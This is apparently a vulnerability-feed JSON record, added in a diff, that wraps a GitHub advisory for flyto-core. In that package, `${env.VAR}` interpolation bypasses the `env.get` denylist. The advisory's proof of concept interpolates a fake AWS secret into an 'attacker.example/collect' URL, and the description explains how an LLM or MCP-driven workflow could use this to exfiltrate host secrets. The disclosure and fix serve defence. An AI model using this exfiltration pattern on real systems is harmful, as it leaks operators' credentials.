@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/204785446?v=4\", \"events_url\": \"https://api.github.com/users/kaimandalic/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/kaimandalic/followers\", \"following_url\": \"https://api.github.com/users/kaimandalic/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/kaimandalic/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/kaimandalic\", \"id\": 204785446, \"login\": \"kaimandalic\", \"node_id\": \"U_kgDODDTHJg\", \"organizations_url\": \"https://api.github.com/users/kaimandalic/orgs\", \"received_events_url\": \"https://api.github.com/users/kaimandalic/received_events\", \"repos_url\": \"https://api.github.com/users/kaimandalic/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/kaimandalic/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/kaimandalic/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/kaimandalic\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-67427\", \"cvss\": {\"score\": 8.6, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.6, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-522\", \"name\": \"Insufficiently Protected Credentials\"}, {\"cwe_id\": \"CWE-668\", \"name\": \"Exposure of Resource to Wrong Sphere\"}, {\"cwe_id\": \"CWE-693\", \"name\": \"Protection Mechanism Failure\"}], \"description\": \"## Summary\\n\\nThe capability policy denies the `env.get` and `env.load_dotenv` modules by default, with the stated reason that they read arbitrary host environment variables (API keys, DSNs) and are a secret-exfil risk. But the workflow engine's variable resolver expands `${env.VAR}` for any environment variable with no allowlist and no policy check, so the exact capability the denylist blocks is available to any workflow parameter. The resolved secret can then be sent out through any allowed module.\\n\\n## Affected code\\n\\n`src/core/engine/variable_resolver.py`:\\n\\n```python\\nif var_type == 'env':\\n    if len(parts) < 2:\\n        return None\\n    env_var = parts[1]\\n    return os.getenv(env_var)      # any env var, no allowlist, not covered by module policy\\n```\\n\\nThe module policy (`enforce_module_policy` in `module_policy.py`) gates module execution at `BaseModule.run`, but `${...}` interpolation happens earlier in the engine and is not subject to it. So denylisting `env.get` does not actually stop a workflow from reading host env secrets.\\n\\n## Reproduction\\n\\nSave as `envbypass_poc.py`, run with `PYTHONPATH=src/src python envbypass_poc.py`.\\n\\n```python\\n#!/usr/bin/env python3\\nimport os\\nos.environ[\\\"AWS_SECRET_ACCESS_KEY\\\"] = \\\"AKIA-operator-super-secret-DO-NOT-LEAK\\\"\\n\\nfrom core.module_policy import module_filter\\nfrom core.engine.variable_resolver import VariableResolver\\n\\nprint(\\\"env.get allowed?       \\\", module_filter.is_allowed(\\\"env.get\\\"))\\nr = VariableResolver(params={}, context={})\\nprint(\\\"resolve ${env.SECRET}: \\\", r.resolve(\\\"${env.AWS_SECRET_ACCESS_KEY}\\\"))\\nprint(\\\"into an attacker URL:  \\\", r.resolve(\\\"https://attacker.example/collect?k=${env.AWS_SECRET_ACCESS_KEY}\\\"))\\n```\\n\\nOutput:\\n\\n```\\nenv.get allowed?        False\\nresolve ${env.SECRET}:  AKIA-operator-super-secret-DO-NOT-LEAK\\ninto an attacker URL:   https://attacker.example/collect?k=AKIA-operator-super-secret-DO-NOT-LEAK\\n```\\n\\n`env.get` is denied, yet `${env.AWS_SECRET_ACCESS_KEY}` reads the same secret and drops it straight into a URL. Confirmed through the running API too: a `POST /v1/workflow/run` step with `text: \\\"${env.AWS_SECRET_ACCESS_KEY}\\\"` resolved to the secret and returned it in the workflow result (in plaintext — the trace redaction did not mask it).\\n\\n## Reachability (why this is not operator self-service)\\n\\nThe vendor denies `env.get` by default and states the reason inline — reading arbitrary host env vars is a secret-exfil risk. That default only makes sense against an untrusted workflow/agent, which is precisely the caller here: workflow parameters and step values come from the LLM through the MCP tool surface or from a hosted-API client, not from the trusted operator. `${env.*}` gives that same denied capability with no gate, so it is a direct bypass of a control the vendor deliberately turned on — not intended behavior.\\n\\n## Impact\\n\\nRead any host environment variable — cloud keys, tokens, DSNs — that the operator relied on the `env.get` denylist to protect, and exfiltrate it by interpolating it into an outbound request handled by an allowed module (the SSRF guard allows the attacker's public host). Reachable via the workflow API and the MCP agent surface.\\n\\n## Suggested fix\\n\\nApply the same policy to `${env.*}` as to the `env.get` module: gate it behind an explicit allowlist of permitted variable names and deny by default when `env.get` is denied, so engine interpolation and module execution enforce one env-access policy. Alternatively drop `${env.*}` and require env values to be passed in explicitly at workflow start.\", \"ghsa_id\": \"GHSA-hr7p-wg7r-hg9m\", \"github_reviewed_at\": \"2026-07-30T14:47:01Z\", \"html_url\": \"https://github.com/advisories/GHSA-hr7p-wg7r-hg9m\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-hr7p-wg7r-hg9m\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-67427\"}], \"nvd_published_at\": \"2026-07-29T19:16:51Z\", \"published_at\": \"2026-07-30T14:47:01Z\", \"references\": [\"https://github.com/flytohub/flyto-core/security/advisories/GHSA-hr7p-wg7r-hg9m\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-67427\", \"https://github.com/flytohub/flyto-core/commit/d5f89d71303e3c1e6418d347c5c55fcd173cc8cc\", \"https://github.com/flytohub/flyto-core/releases/tag/v2.26.6\", \"https://github.com/advisories/GHSA-hr7p-wg7r-hg9m\"], \"repository_advisory_url\": \"https://api.github.com/repos/flytohub/flyto-core/security-advisories/GHSA-hr7p-wg7r-hg9m\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/flytohub/flyto-core\", \"summary\": \"Flyto2 Core: ${env.VAR} interpolation reads any env secret despite env.get being denylisted\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-30T14:47:03Z\", \"url\": \"https://api.github.com/advisories/GHSA-hr7p-wg7r-hg9m\", \"vulnerabilities\": [{\"first_patched_version\": \"2.26.7\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"flyto-core\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.26.7\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-hr7p-wg7r-hg9m",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "flyto-core: < 2.26.7"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-67427"
+    ],
+    "cvss_score": 8.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "flyto-core"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-30T19:38:01.464767Z",
+  "provenance": {
+    "content_sha256": "dad4e8956fa250831b78555e7ae1f9567fbc68fe79b53be1b8d906c2b80192ac",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-30T14:47:01Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-hr7p-wg7r-hg9m",
+  "status": "active",
+  "title": "Flyto2 Core: ${env.VAR} interpolation reads any env secret despite env.get being denylisted",
+  "updated_at": "2026-07-30T14:47:03Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-hr7p-wg7r-hg9m"
+}
